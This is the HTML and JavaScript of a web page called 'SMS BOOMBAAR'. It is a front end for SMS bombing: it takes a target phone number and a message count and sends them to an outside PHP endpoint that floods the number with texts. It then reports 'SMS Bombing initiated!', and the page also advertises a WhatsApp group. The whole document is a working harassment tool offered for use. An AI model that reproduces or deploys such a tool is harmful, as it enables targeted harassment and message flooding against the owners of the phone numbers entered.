<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS BOOMBAAR</title>
    <style>
        body {
            font-family: 'Arial Black', sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: 
                radial-gradient(circle at 25% 25%, rgba(255,0,0,0.2) 0%, transparent 50%),
                radial-gradient(circle at 75% 75%, rgba(255,0,0,0.2) 0%, transparent 50%);
        }
        
        .container {
            background-color: #111;
            border: 3px solid #f00;
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 0 20px rgba(255,0,0,0.5),
                        0 0 40px rgba(255,0,0,0.3);
            position: relative;
            overflow: hidden;
        }
        
        .container::before {
            content: "";
            position: absolute;
            top: -10px;
            left: -10px;
            right: -10px;
            bottom: -10px;
            border: 2px dashed #f00;
            border-radius: 20px;
            animation: pulse 2s infinite;
            pointer-events: none;
        }
        
        @keyframes pulse {
            0% { opacity: 0.5; }
            50% { opacity: 0.2; }
            100% { opacity: 0.5; }
        }
        
        h1 {
            color: #f00;
            text-align: center;
            text-shadow: 0 0 10px rgba(255,0,0,0.7);
            margin-bottom: 30px;
            font-size: 2.5em;
            letter-spacing: 2px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #f00;
            font-weight: bold;
        }
        
        input, select {
            width: 100%;
            padding: 12px;
            border: 2px solid #f00;
            border-radius: 5px;
            background-color: #222;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        select {
            appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='red'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 20px;
        }
        
        .custom-amount {
            display: none;
            margin-top: 10px;
        }
        
        .btn {
            display: block;
            width: 100%;
            padding: 15px;
            margin: 20px 0;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            text-decoration: none;
        }
        
        .boom-btn {
            background: linear-gradient(to bottom, #f00, #800);
            color: #fff;
            text-shadow: 0 0 5px #000;
            box-shadow: 0 0 15px rgba(255,0,0,0.7);
        }
        
        .boom-btn:hover {
            background: linear-gradient(to bottom, #f33, #a00);
            box-shadow: 0 0 25px rgba(255,0,0,0.9);
            transform: scale(1.02);
        }
        
        .whatsapp-btn {
            background: linear-gradient(to bottom, #25D366, #128C7E);
            color: #fff;
            margin-top: 30px;
        }
        
        .whatsapp-btn:hover {
            background: linear-gradient(to bottom, #2ef37a, #1a9f8f);
        }
        
        .skull {
            position: absolute;
            font-size: 50px;
            opacity: 0.1;
            z-index: -1;
        }
        
        .skull-1 { top: 20px; left: 20px; }
        .skull-2 { bottom: 20px; right: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="skull skull-1">💀</div>
        <div class="skull skull-2">💀</div>
        
        <h1>SMS BOOMBAAR</h1>
        
        <div class="input-group">
            <label for="number">Phone Number:</label>
            <input type="text" id="number" placeholder="923XXXXXXXXX" required>
        </div>
        
        <div class="input-group">
            <label for="amount">Amount:</label>
            <select id="amount-select">
                <option value="10">10</option>
                <option value="20">20</option>
                <option value="30">30</option>
                <option value="40">40</option>
                <option value="50">50</option>
                <option value="custom">Custom</option>
            </select>
            <input type="number" id="custom-amount" class="custom-amount" placeholder="Enter custom amount">
        </div>
        
        <button class="btn boom-btn" id="boom-btn">BOOMB💣</button>
        
        <a href="https://chat.whatsapp.com/IToJmr2y7am75SME19Jlxu" class="btn whatsapp-btn" target="_blank">
            Join WhatsApp Group
        </a>
    </div>

    <script>
        // Show custom amount field when "Custom" is selected
        const amountSelect = document.getElementById('amount-select');
        const customAmount = document.getElementById('custom-amount');
        
        amountSelect.addEventListener('change', function() {
            if (this.value === 'custom') {
                customAmount.style.display = 'block';
                customAmount.focus();
            } else {
                customAmount.style.display = 'none';
            }
        });
        
        // Handle the BOOMB button click
        const boomBtn = document.getElementById('boom-btn');
        const numberInput = document.getElementById('number');
        
        boomBtn.addEventListener('click', function() {
            const number = numberInput.value.trim();
            
            if (!number) {
                alert('Please enter a phone number');
                return;
            }
            
            // Get the selected amount
            let amount;
            if (amountSelect.value === 'custom') {
                amount = customAmount.value.trim();
            } else {
                amount = amountSelect.value;
            }
            
            if (!amount || isNaN(amount) || amount <= 0) {
                alert('Please enter a valid amount');
                return;
            }
            
            // Construct the API URL
            const apiUrl = `https://fam-official.serv00.net/sim/famsimsmsboom.php?number=${number}&amount=${amount}`;
            
            // Send the request (using fetch API)
            boomBtn.disabled = true;
            boomBtn.textContent = 'BOOMING...';
            
            fetch(apiUrl)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.text();
                })
                .then(data => {
                    alert(`SMS Bombing initiated! Response: ${data}`);
                })
                .catch(error => {
                    alert(`Error: ${error.message}`);
                })
                .finally(() => {
                    boomBtn.disabled = false;
                    boomBtn.textContent = 'BOOMB💣';
                });
        });
    </script>
</body>
</html>